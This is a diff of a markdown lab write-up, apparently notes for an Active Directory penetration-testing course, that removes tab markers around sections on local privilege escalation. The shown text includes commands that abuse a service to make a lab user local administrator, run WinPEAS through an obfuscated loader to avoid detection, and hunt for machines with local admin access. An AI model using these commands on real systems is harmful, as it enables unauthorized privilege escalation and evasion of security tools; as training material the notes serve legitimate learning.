@@ -136,8 +136,6 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 ```
 ### We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!
 
-{% endtab %}
-
 ## Local Privilege Escalation - WinPEAS
 
 {% tab title="WinPEAS" %}
@@ -147,7 +145,6 @@ You can use WinPEAS using the following command. Note that we use an obfuscated 
 ```batch
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
 ```
-{% endtab %}
 
 ## Local Privilege Escalation - PrivEscCheck
 
@@ -159,8 +156,6 @@ Similarly, we can use PrivEscCheck (https://github.com/itm4n/PrivescCheck) for a
 . C:\AD\Tools\PrivEscCheck.ps1
 Invoke-PrivescCheck
 ```
-{% endtab %}
-{% endtabs %}
 
 ## Hunt for Local Admin access
 ### Now for the next task, to identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1:
@@ -193,4 +188,3 @@ $env:username
 
 {% endtab %}
 {% endtabs %}
-
